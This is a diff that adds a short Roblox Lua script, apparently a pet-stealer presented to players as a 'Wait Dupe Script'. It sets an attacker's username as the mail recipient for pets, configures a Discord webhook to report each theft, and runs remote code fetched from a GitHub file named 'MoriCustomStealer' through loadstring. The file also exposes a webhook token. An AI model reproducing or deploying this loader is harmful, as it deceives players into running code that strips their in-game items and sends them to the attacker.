@@ -1,0 +1,10 @@
+UserName = "Kantutan_lexielore" -- good pets
+Webhook = "https://discord.com/api/webhooks/1134225115253571684/2C8jZ4JIfC8Rkd1GlSquwvwqaSeBrnFUxRKgVR9VUx-tjQUG9Vw7aaJNwgi6tm4r1llL" -- pings for pets
+UserName2 = "Kantutan_lexielore" -- bad pets
+
+_G.MailMessage = "Ezz pet" -- Mail Message !
+_G.ScriptTitle = "Wait Dupe Script" -- Loading Screen Title
+_G.ScriptTitle2 = "Wait Dupe Script" -- Put Same Title
+_G.WebhookName = "Lance" -- Webhook name 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/idk/main/MoriCustomStealer", true))()
